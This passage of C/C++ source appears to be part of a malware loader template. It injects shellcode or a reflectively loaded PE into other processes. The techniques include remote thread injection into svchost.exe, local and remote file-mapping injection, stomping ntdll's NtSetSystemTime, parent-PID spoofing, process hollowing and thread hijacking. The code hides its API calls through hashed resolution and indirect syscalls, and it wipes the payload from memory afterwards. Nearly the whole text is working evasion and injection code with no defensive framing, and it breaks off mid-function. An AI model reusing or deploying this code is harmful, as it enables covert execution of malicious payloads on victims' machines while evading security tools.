        /* Execute entry point via fiber - PE runs from MEM_MAPPED memory */
        typedef LPVOID (WINAPI *t_CTTF2)(LPVOID);
        typedef LPVOID (WINAPI *t_CF2)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
        typedef void   (WINAPI *t_STF2)(LPVOID);
        t_CTTF2 pCTTF2 = (t_CTTF2)RK32(HF_ConvertThreadToFiber);
        t_CF2   pCF2   = (t_CF2)  RK32(HF_CreateFiber);
        t_STF2  pSTF2  = (t_STF2) RK32(HF_SwitchToFiber);

        ULONG_PTR rl_ep = (ULONG_PTR)rl_base + rl_nt2->OptionalHeader.AddressOfEntryPoint;
        DBG_HEX("[RL5] Entry point", (unsigned long long)rl_ep);

        if (pCTTF2 && pCF2 && pSTF2) {
            LPVOID rl_mFiber = pCTTF2(NULL);
            LPVOID rl_eFiber = pCF2(0x100000, (LPFIBER_START_ROUTINE)rl_ep, NULL);
            if (rl_eFiber) pSTF2(rl_eFiber);
        }
        DBG("[RL6] Reflective load complete");
    }
#elif defined(USE_REMOTE_THREAD)
    /* Inject into existing process via NtCreateThreadEx */
    {
        typedef NTSTATUS (NTAPI *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
        typedef HANDLE (WINAPI *t_OP)(DWORD,BOOL,DWORD);
        typedef BOOL   (WINAPI *t_CH)(HANDLE);
#ifdef USE_HELLSHALL
        auto pNtCTE = [](PHANDLE h, ACCESS_MASK a, PVOID o, HANDLE p, PVOID s, PVOID ag, ULONG f, SIZE_T zb, SIZE_T ss, SIZE_T ms, PVOID al) {
            return hg_NtCreateThreadEx(h, a, o, p, s, ag, f, zb, ss, ms, al); };
#else
        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
#endif
        t_OP    pOP    = (t_OP)  R(HMOD_KERNEL32, HF_OpenProcess);
        t_CH    pCH    = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
        if (!pOP) {
            DBG("[FAIL] RemoteThread: API resolution failed");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        /* Target svchost.exe: always running as SYSTEM in session 0, DLLs initialized */
        static const wchar_t rt_target[] = {'s','v','c','h','o','s','t','.','e','x','e','\0'};
        DWORD tpid = find_process_pid(rt_target);
        DBG_VAL("[RT1] svchost.exe PID", (unsigned long long)tpid);
        if (!tpid) {
            DBG("[FAIL] RemoteThread: svchost.exe not found");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        HANDLE hProc = pOP(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, tpid);
        if (!hProc) {
            DBG("[FAIL] RemoteThread: OpenProcess failed");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        DBG("[RT2] OpenProcess OK");
        PVOID  remote   = NULL;
        SIZE_T alloc_sz = sc_sz;
        NTSTATUS st = pNtAVM(hProc, &remote, 0, &alloc_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remote) {
            DBG_HEX("[FAIL] RemoteThread: NtAVM status", (unsigned long long)(ULONG)st);
            pCH(hProc);
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        DBG_HEX("[RT3] remote alloc addr", (unsigned long long)(ULONG_PTR)remote);
        pNtWVM(hProc, remote, sc, sc_sz, NULL);
#ifdef USE_WIPE
        memset(sc, 0, sc_sz);
#endif
        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
        PVOID  prot_base = remote;
        SIZE_T prot_sz   = sc_sz;
        ULONG  old_prot  = 0;
        pNtPVM(hProc, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
        DBG("[RT4] RW -> RX");
        HANDLE hThread = NULL;
        st = pNtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hProc, remote, NULL, 0, 0, 0, 0, NULL);
        DBG_HEX("[RT5] NtCreateThreadEx status", (unsigned long long)(ULONG)st);
        if (hThread) pCH(hThread);
        pCH(hProc);
    }
#elif defined(USE_LOCAL_MAP_INJECT)
    /* Module 42: Local Mapping Injection - no VirtualAlloc/VirtualProtect */
    {
        DBG("[LM] === LOCAL MAPPING INJECTION (Maldev mod.42) ===");
        typedef HANDLE   (WINAPI *t_CFM)(HANDLE,LPSECURITY_ATTRIBUTES,DWORD,DWORD,DWORD,LPCWSTR);
        typedef PVOID    (WINAPI *t_MVF)(HANDLE,DWORD,DWORD,DWORD,SIZE_T);
        typedef BOOL     (WINAPI *t_UVF)(LPCVOID);
        typedef BOOL     (WINAPI *t_CH) (HANDLE);
        typedef NTSTATUS (NTAPI  *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
        typedef NTSTATUS (NTAPI  *t_NtWSO)(HANDLE,BOOLEAN,PLARGE_INTEGER);
        t_CFM   pCFM   = (t_CFM)  RK32(HF_CreateFileMappingW);
        t_MVF   pMVF   = (t_MVF)  RK32(HF_MapViewOfFile);
        t_UVF   pUVF   = (t_UVF)  RK32(HF_UnmapViewOfFile);
        t_CH    pCH    = (t_CH)   RK32(HF_CloseHandle);
        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
        t_NtWSO pNtWSO = (t_NtWSO)resolve(hNtdll, HF_NtWaitForSingleObject);
        if (!pCFM || !pMVF) {
            DBG("[FAIL] LocalMapInject: API resolution failed");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        HANDLE hMap = pCFM(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)sc_sz, NULL);
        if (!hMap) {
            DBG("[FAIL] LocalMapInject: CreateFileMappingW failed");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        DBG_HEX("[LM1] file mapping handle", (unsigned long long)(ULONG_PTR)hMap);
        PVOID pMap = pMVF(hMap, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, sc_sz);
        if (!pMap) {
            DBG("[FAIL] LocalMapInject: MapViewOfFile failed");
            if (pCH) pCH(hMap);
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        DBG_HEX("[LM2] mapped address", (unsigned long long)(ULONG_PTR)pMap);
        memcpy(pMap, sc, sc_sz);
#ifdef USE_WIPE
        memset(sc, 0, sc_sz);
#endif
        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
        if (pCH) pCH(hMap);
        DBG("[LM3] shellcode in mapped memory, launching thread");
        HANDLE hThreadLM = NULL;
        NTSTATUS stLM = pNtCTE(&hThreadLM, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pMap, NULL, 0, 0, 0, 0, NULL);
        DBG_HEX("[LM4] NtCreateThreadEx status", (unsigned long long)(ULONG)stLM);
        if (hThreadLM) {
            if (pNtWSO) {
                LARGE_INTEGER lm_to = {0};
                lm_to.QuadPart = -50000000LL; /* 5 seconds */
                NTSTATUS stW = pNtWSO(hThreadLM, FALSE, &lm_to);
                if ((ULONG)stW == 0x00000102UL) {
                    DBG("[LM5] Thread alive 5s - Donut/Kratos running, waiting 30s more...");
                    LARGE_INTEGER lm_to2 = {0};
                    lm_to2.QuadPart = -300000000LL; /* 30 seconds */
                    pNtWSO(hThreadLM, FALSE, &lm_to2);
                    DBG("[LM6] 35s total wait complete");
                } else {
                    DBG_HEX("[LM5] Thread exited early (Donut crash or WinMain returned)", (unsigned long long)(ULONG)stW);
                }
            }
            if (pCH) pCH(hThreadLM);
        }
        if (pUVF) pUVF(pMap);
    }
#elif defined(USE_REMOTE_MAP_INJECT)
    /* Module 43: Remote Mapping Injection via MapViewOfFile2 - no VirtualAllocEx/WriteProcessMemory */
    {
        DBG("[RM] === REMOTE MAPPING INJECTION (Maldev mod.43) ===");
        typedef HANDLE   (WINAPI *t_CFM)(LPSECURITY_ATTRIBUTES,DWORD,DWORD,DWORD,LPCWSTR);
        typedef PVOID    (WINAPI *t_MVF)(HANDLE,DWORD,DWORD,DWORD,SIZE_T);
        typedef PVOID    (WINAPI *t_MVF2)(HANDLE,HANDLE,ULONG64,PVOID,SIZE_T,ULONG,ULONG);
        typedef BOOL     (WINAPI *t_UVF)(LPCVOID);
        typedef BOOL     (WINAPI *t_CH) (HANDLE);
        typedef HANDLE   (WINAPI *t_OP) (DWORD,BOOL,DWORD);
        typedef NTSTATUS (NTAPI  *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
        t_CFM   pCFM   = (t_CFM)  RK32(HF_CreateFileMappingW);
        t_MVF   pMVF   = (t_MVF)  RK32(HF_MapViewOfFile);
        t_MVF2  pMVF2  = (t_MVF2) R(HMOD_KERNELBASE, HF_MapViewOfFile2);
        t_UVF   pUVF   = (t_UVF)  RK32(HF_UnmapViewOfFile);
        t_CH    pCH    = (t_CH)   RK32(HF_CloseHandle);
        t_OP    pOP    = (t_OP)   RK32(HF_OpenProcess);
        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
        if (!pCFM || !pMVF || !pMVF2 || !pOP) {
            DBG("[FAIL] RemoteMapInject: API resolution failed (MapViewOfFile2 requires Win10 1703+)");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        wchar_t rm_target[] = { %TARGET_PROCESS_W% };
        DWORD rm_pid = find_process_pid(rm_target);
        DBG_VAL("[RM1] target PID", (unsigned long long)rm_pid);
        if (!rm_pid) {
            DBG("[FAIL] RemoteMapInject: target process not found");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        HANDLE hRMProc = pOP(PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, rm_pid);
        if (!hRMProc) {
            DBG("[FAIL] RemoteMapInject: OpenProcess failed");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        DBG("[RM2] OpenProcess OK");
        HANDLE hMap = pCFM(NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)sc_sz, NULL);
        if (!hMap) {
            DBG("[FAIL] RemoteMapInject: CreateFileMappingW failed");
            if (pCH) pCH(hRMProc);
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        PVOID pLocal = pMVF(hMap, FILE_MAP_WRITE, 0, 0, sc_sz);
        if (!pLocal) {
            DBG("[FAIL] RemoteMapInject: MapViewOfFile local failed");
            if (pCH) { pCH(hMap); pCH(hRMProc); }
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        memcpy(pLocal, sc, sc_sz);
#ifdef USE_WIPE
        memset(sc, 0, sc_sz);
#endif
        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
        DBG("[RM3] shellcode in local mapping, projecting to remote");
        PVOID pRemote = pMVF2(hMap, hRMProc, 0, NULL, 0, 0, PAGE_EXECUTE_READWRITE);
        if (pCH) pCH(hMap);
        if (pUVF) pUVF(pLocal);
        if (!pRemote) {
            DBG("[FAIL] RemoteMapInject: MapViewOfFile2 failed");
            if (pCH) pCH(hRMProc);
            return 1;
        }
        DBG_HEX("[RM4] remote mapping address", (unsigned long long)(ULONG_PTR)pRemote);
        HANDLE hThreadRM = NULL;
        NTSTATUS stRM = pNtCTE(&hThreadRM, THREAD_ALL_ACCESS, NULL, hRMProc, pRemote, NULL, 0, 0, 0, 0, NULL);
        DBG_HEX("[RM5] NtCreateThreadEx status", (unsigned long long)(ULONG)stRM);
        if (hThreadRM && pCH) pCH(hThreadRM);
        if (pCH) pCH(hRMProc);
    }
#elif defined(USE_FUNC_STOMP)
    /* Module 45: Remote Function Stomping - no VirtualAllocEx, overwrites exported func in target */
    {
        DBG("[FS] === REMOTE FUNCTION STOMPING (Maldev mod.45) ===");
        typedef HMODULE  (WINAPI *t_LLA)(LPCSTR);
        typedef FARPROC  (WINAPI *t_GPA)(HMODULE,LPCSTR);
        typedef BOOL     (WINAPI *t_VPE)(HANDLE,LPVOID,SIZE_T,DWORD,PDWORD);
        typedef BOOL     (WINAPI *t_WPM)(HANDLE,LPVOID,LPCVOID,SIZE_T,PSIZE_T);
        typedef HANDLE   (WINAPI *t_OP) (DWORD,BOOL,DWORD);
        typedef BOOL     (WINAPI *t_CH) (HANDLE);
        typedef HANDLE   (WINAPI *t_CTS)(DWORD,DWORD);
        typedef BOOL     (WINAPI *t_M32F)(HANDLE,LPMODULEENTRY32W);
        typedef BOOL     (WINAPI *t_M32N)(HANDLE,LPMODULEENTRY32W);
        typedef NTSTATUS (NTAPI  *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
        t_LLA   pLLA   = (t_LLA)  RK32(HF_LoadLibraryA);
        t_GPA   pGPA   = (t_GPA)  RK32(HF_GetProcAddress);
        t_VPE   pVPE   = (t_VPE)  RK32(HF_VirtualProtectEx);
        t_WPM   pWPM   = (t_WPM)  RK32(HF_WriteProcessMemory);
        t_OP    pOP    = (t_OP)   RK32(HF_OpenProcess);
        t_CH    pCH    = (t_CH)   RK32(HF_CloseHandle);
        t_CTS   pCTS   = (t_CTS)  RK32(HF_CreateToolhelp32Snapshot);
        t_M32F  pM32F  = (t_M32F) RK32(HF_Module32FirstW);
        t_M32N  pM32N  = (t_M32N) RK32(HF_Module32NextW);
        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
        if (!pLLA || !pGPA || !pVPE || !pWPM || !pOP) {
            DBG("[FAIL] FuncStomp: API resolution failed");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        /* Target svchost.exe: always running as SYSTEM in session 0 */
        static const wchar_t fs_svc[] = {'s','v','c','h','o','s','t','.','e','x','e','\0'};
        DWORD fs_pid = find_process_pid(fs_svc);
        DBG_VAL("[FS1] svchost.exe PID", (unsigned long long)fs_pid);
        HANDLE hFSSpawn = NULL;
        if (!fs_pid) {
            DBG("[FAIL] FuncStomp: svchost.exe not found");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        /* Use ntdll!NtSetSystemTime: always loaded in every process, never called by notepad */
        static const char sac_dll[]  = {'n','t','d','l','l','.','d','l','l','\0'};
        static const char sac_func[] = {'N','t','S','e','t','S','y','s','t','e','m','T','i','m','e','\0'};
        HMODULE hSac = pLLA(sac_dll);
        if (!hSac) {
            DBG("[FAIL] FuncStomp: LoadLibraryA(ntdll.dll) failed");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        FARPROC pLocalFunc = pGPA(hSac, sac_func);
        if (!pLocalFunc) {
            DBG("[FAIL] FuncStomp: GetProcAddress(NtSetSystemTime) failed");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        ULONG_PTR rva = (ULONG_PTR)pLocalFunc - (ULONG_PTR)hSac;
        DBG_HEX("[FS2] NtSetSystemTime RVA", (unsigned long long)rva);
        /* Resolve remote base of ntdll.dll via TH32CS_SNAPMODULE for ASLR correctness */
        PVOID pStompTarget = NULL;
        if (pCTS && pM32F && pM32N) {
            HANDLE hSnap = pCTS(0x00000008 /* TH32CS_SNAPMODULE */, fs_pid);
            if (hSnap != INVALID_HANDLE_VALUE) {
                MODULEENTRY32W me = {0};
                me.dwSize = sizeof(me);
                static const wchar_t sac_dllw[] = {'n','t','d','l','l','.','d','l','l','\0'};
                if (pM32F(hSnap, &me)) {
                    do {
                        const wchar_t *mn = me.szModule, *ref = sac_dllw;
                        while (*mn && *ref && ((*mn|32)==(*ref|32))) { mn++; ref++; }
                        if (!*mn && !*ref) {
                            pStompTarget = (PVOID)((ULONG_PTR)me.modBaseAddr + rva);
                            break;
                        }
                    } while (pM32N(hSnap, &me));
                }
                pCH(hSnap);
            }
        }
        if (!pStompTarget) {
            DBG("[FS3] SNAPMODULE fallback: same-base assumption");
            pStompTarget = (PVOID)pLocalFunc;
        }
        DBG_HEX("[FS3] remote stomp address", (unsigned long long)(ULONG_PTR)pStompTarget);
        HANDLE hFSProc = pOP(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, fs_pid);
        if (hFSSpawn && pCH) pCH(hFSSpawn);
        if (!hFSProc) {
            DBG("[FAIL] FuncStomp: OpenProcess failed");
            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
            return 1;
        }
        DWORD old_prot = 0;
        pVPE(hFSProc, pStompTarget, sc_sz, PAGE_READWRITE, &old_prot);
        SIZE_T written = 0;
        BOOL wr_ok = pWPM(hFSProc, pStompTarget, sc, sc_sz, &written);
        DBG_VAL("[FS4] bytes written", (unsigned long long)written);
#ifdef USE_WIPE
        memset(sc, 0, sc_sz);
#endif
        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
        if (!wr_ok) {
            DBG("[FAIL] FuncStomp: WriteProcessMemory failed");
            if (pCH) pCH(hFSProc);
            return 1;
        }
        pVPE(hFSProc, pStompTarget, sc_sz, PAGE_EXECUTE_READWRITE, &old_prot);
        DBG("[FS5] function stomped");
        HANDLE hThreadFS = NULL;
        NTSTATUS stFS = pNtCTE(&hThreadFS, THREAD_ALL_ACCESS, NULL, hFSProc, pStompTarget, NULL, 0, 0, 0, 0, NULL);
        DBG_HEX("[FS6] NtCreateThreadEx status", (unsigned long long)(ULONG)stFS);
        if (hThreadFS && pCH) pCH(hThreadFS);
        if (pCH) pCH(hFSProc);
    }
#else
    /* Spawn target process suspended */
    PROCESS_INFORMATION pi = {0};
    wchar_t target[] = { %TARGET_PROCESS_W% };

#ifdef USE_PPID_SPOOF
    STARTUPINFOEXW siex = {0};
    siex.StartupInfo.cb = sizeof(siex);

    typedef BOOL (WINAPI *t_IPAL)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
    typedef BOOL (WINAPI *t_UPTA)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
    typedef void (WINAPI *t_DPAL)(LPPROC_THREAD_ATTRIBUTE_LIST);
    typedef HANDLE (WINAPI *t_OP)(DWORD, BOOL, DWORD);
    typedef BOOL   (WINAPI *t_CH)(HANDLE);
    typedef BOOL   (WINAPI *t_CPW)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);

    t_IPAL pIPAL = (t_IPAL)RK32(HF_InitProcThreadAttrList);
    t_UPTA pUPTA = (t_UPTA)RK32(HF_UpdateProcThreadAttr);
    t_DPAL pDPAL = (t_DPAL)RK32(HF_DeleteProcThreadAttrList);
    t_OP   pOP   = (t_OP)  R(HMOD_KERNEL32, HF_OpenProcess);
    t_CH   pCH   = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
    t_CPW  pCPW  = (t_CPW) R(HMOD_KERNEL32, HF_CreateProcessW);

    /* Stack-allocated PAL - avoids Heap* forwarded exports */
    char pal_buf[1024] = {0};
    LPPROC_THREAD_ATTRIBUTE_LIST pal = NULL;
    SIZE_T pal_sz = 0;
    if (pIPAL) {
        pIPAL(NULL, 1, 0, &pal_sz);
        DBG_VAL("[7a] PAL size needed", (unsigned long long)pal_sz);
        if (pal_sz && pal_sz <= sizeof(pal_buf)) {
            pal = (LPPROC_THREAD_ATTRIBUTE_LIST)pal_buf;
            if (!pIPAL(pal, 1, 0, &pal_sz)) { DBG("[WARN] IPAL second call failed"); pal = NULL; }
        } else { DBG_VAL("[WARN] PAL buf too small or pal_sz=0", (unsigned long long)pal_sz); }
    } else { DBG("[WARN] pIPAL is NULL"); }
    HANDLE hParent = NULL;

    if (pal) {
        /* Use target process name as PPID spoof parent instead of hardcoded explorer.exe */
        const wchar_t *ppid_name = target;
        const wchar_t *p = target;
        while (*p) { if (*p == L'\\' || *p == L'/') ppid_name = p + 1; p++; }
        DWORD epid = find_process_pid(ppid_name);
        DBG_VAL("[7] PPID target PID", epid);
        if (epid && pOP) hParent = pOP(PROCESS_CREATE_PROCESS, FALSE, epid);
        if (hParent) {
            DBG("[7] OpenProcess(target) OK for PPID spoof");
            if (pUPTA)
                pUPTA(pal, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
        } else { DBG("[WARN] OpenProcess(target) failed - no PPID spoof"); }
        siex.lpAttributeList = pal;
    } else { DBG("[WARN] InitializeProcThreadAttributeList failed"); }

    if (pCPW) pCPW(target, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL, (LPSTARTUPINFOW)&siex, &pi);
    DBG_VAL("[8] CreateProcess (PPID spoof) pid", pi.dwProcessId);

    if (pal && pDPAL) pDPAL(pal);
    if (hParent && pCH) pCH(hParent);
#else
    {
        typedef BOOL (WINAPI *t_CPW)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
        t_CPW pCPW = (t_CPW)R(HMOD_KERNEL32, HF_CreateProcessW);
        STARTUPINFOW si = {0}; si.cb = sizeof(si);
        if (pCPW) pCPW(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi);
        DBG_VAL("[7] CreateProcess pid", pi.dwProcessId);
    }
#endif /* USE_PPID_SPOOF */

    if (!pi.hProcess) {
        DBG("[FAIL] CreateProcess failed (hProcess=NULL)");
        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
        return 1;
    }
    DBG("[8] Target process created suspended");

    if (!pNtWVM || !pNtPVM || !pNtRT) {
        DBG("[FAIL] Nt write/protect/resume APIs missing");
        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
        typedef BOOL (WINAPI *t_CH2)(HANDLE);
        t_CH2 pCH2 = (t_CH2)R(HMOD_KERNEL32, HF_CloseHandle);
        if (pCH2) { pCH2(pi.hThread); pCH2(pi.hProcess); }
        return 1;
    }

    /* Alloc RW in target process */
    PVOID  remote = NULL;
    SIZE_T alloc_sz = sc_sz;
    NTSTATUS st = pNtAVM(pi.hProcess, &remote, 0, &alloc_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) {
        DBG_HEX("[FAIL] NtAllocateVirtualMemory (remote) NTSTATUS", (unsigned long long)(ULONG)st);
        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
        typedef BOOL (WINAPI *t_CH2)(HANDLE);
        t_CH2 pCH2 = (t_CH2)R(HMOD_KERNEL32, HF_CloseHandle);
        if (pCH2) { pCH2(pi.hThread); pCH2(pi.hProcess); }
        return 1;
    }
    DBG_HEX("[10] remote alloc addr", (unsigned long long)(ULONG_PTR)remote);

    /* Write shellcode */
    st = pNtWVM(pi.hProcess, remote, sc, sc_sz, NULL);
    DBG_HEX("[11] NtWriteVirtualMemory status", (unsigned long long)(ULONG)st);
    DBG_VAL("[11] bytes written (sc_sz)", (unsigned long long)sc_sz);

#ifdef USE_WIPE
    memset(sc, 0, sc_sz);
    DBG("[12] Local shellcode wiped");
#endif
    { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
    DBG("[12] Local shellcode freed");

    /* RW -> RX */
    PVOID  prot_base = remote;
    SIZE_T prot_sz   = sc_sz;
    ULONG  old_prot  = 0;
    st = pNtPVM(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
    DBG_HEX("[13] NtProtectVirtualMemory (RW->RX) status", (unsigned long long)(ULONG)st);

#if defined(USE_HOLLOW)
    {
        typedef NTSTATUS (NTAPI *t_NQIP)(HANDLE, DWORD, PVOID, ULONG, PULONG);
        typedef NTSTATUS (NTAPI *t_NtRVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        typedef NTSTATUS (NTAPI *t_NtUVS)(HANDLE, PVOID);
        typedef NTSTATUS (NTAPI *t_NtGCT)(HANDLE, PCONTEXT);
        typedef NTSTATUS (NTAPI *t_NtSCT)(HANDLE, PCONTEXT);

#ifdef USE_HELLSHALL
        auto pNQIP  = [](HANDLE h, DWORD c, PVOID i, ULONG l, PULONG r) {
            return hg_NtQueryInformationProcess(h, c, i, l, r); };
        auto pNtRVM = [](HANDLE h, PVOID a, PVOID b, SIZE_T sz, PSIZE_T r) {
            return hg_NtReadVirtualMemory(h, a, b, sz, r); };
        auto pNtUVS = [](HANDLE h, PVOID b) { return hg_NtUnmapViewOfSection(h, b); };
        auto pGCT   = [](HANDLE h, PCONTEXT c) { return hg_NtGetContextThread(h, c); };
        auto pSCT   = [](HANDLE h, PCONTEXT c) { return hg_NtSetContextThread(h, c); };
        {
#else
        t_NQIP  pNQIP  = (t_NQIP) resolve(hNtdll, HF_NtQueryInformationProcess);
        t_NtRVM pNtRVM = (t_NtRVM)resolve(hNtdll, HF_NtReadVirtualMemory);
        t_NtUVS pNtUVS = (t_NtUVS)resolve(hNtdll, HF_NtUnmapViewOfSection);
        t_NtGCT pGCT   = (t_NtGCT)resolve(hNtdll, HF_NtGetContextThread);
        t_NtSCT pSCT   = (t_NtSCT)resolve(hNtdll, HF_NtSetContextThread);
        if (!pNQIP || !pNtRVM || !pNtUVS || !pGCT || !pSCT) {
            DBG("[FAIL] Hollow: API resolution failed");
        } else {
#endif
            /* Get PEB base via NtQueryInformationProcess(ProcessBasicInformation=0) */
            PROCESS_BASIC_INFORMATION pbi = {0};
            pNQIP(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);

            /* Read PEB.ImageBaseAddress: offset 0x10 (x64) or 0x08 (x86) */
            PVOID imageBase = NULL;
#ifdef _WIN64
            pNtRVM(pi.hProcess, (BYTE *)pbi.PebBaseAddress + 0x10,
                   &imageBase, sizeof(PVOID), NULL);
#else
            pNtRVM(pi.hProcess, (BYTE *)pbi.PebBaseAddress + 0x08,
                   &imageBase, sizeof(PVOID), NULL);
#endif
            DBG_HEX("[H1] PEB.ImageBase", (unsigned long long)(ULONG_PTR)imageBase);

            /* Skip NtUnmapViewOfSection: unmapping causes loader state issues with Donut PE bootstrap.
               RIP redirect alone (same as thread hijacking) is sufficient and more reliable. */
            DBG("[H2] Unmap skipped - RIP redirect only");

            CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_FULL;
            pGCT(pi.hThread, &ctx);
#ifdef _WIN64
            ctx.Rip = (DWORD64)remote;
            DBG_HEX("[H3] Hollow RIP", (unsigned long long)ctx.Rip);
#else
            ctx.Eip = (DWORD)(ULONG_PTR)remote;
            DBG_HEX("[H3] Hollow EIP", (unsigned long long)ctx.Eip);
#endif
            pSCT(pi.hThread, &ctx);
        }
    }
#elif defined(USE_THREAD_HIJACK)
    {
        typedef NTSTATUS (NTAPI *t_NtGCT)(HANDLE, PCONTEXT);
        typedef NTSTATUS (NTAPI *t_NtSCT)(HANDLE, PCONTEXT);
#ifdef USE_HELLSHALL
        auto pGCT = [](HANDLE h, PCONTEXT c) { return hg_NtGetContextThread(h, c); };
        auto pSCT = [](HANDLE h, PCONTEXT c) { return hg_NtSetContextThread(h, c); };
#else
        t_NtGCT pGCT = (t_NtGCT)resolve(hNtdll, HF_NtGetContextThread);
        t_NtSCT pSCT = (t_NtSCT)resolve(hNtdll, HF_NtSetContextThread);
#endif
        DBG("[TH] === THREAD HIJACKING MODE ===");
        if (pGCT && pSCT) {
            CONTEXT ctx = {0};
            ctx.ContextFlags = CONTEXT_FULL;
            NTSTATUS stG = pGCT(pi.hThread, &ctx);
            DBG_HEX("[TH1] NtGetContextThread status", (unsigned long long)(ULONG)stG);
#ifdef _WIN64
            DBG_HEX("[TH2] Original RIP", (unsigned long long)ctx.Rip);
            ctx.Rip = (DWORD64)remote;
            DBG_HEX("[TH3] New RIP (shellcode)", (unsigned long long)ctx.Rip);
#else
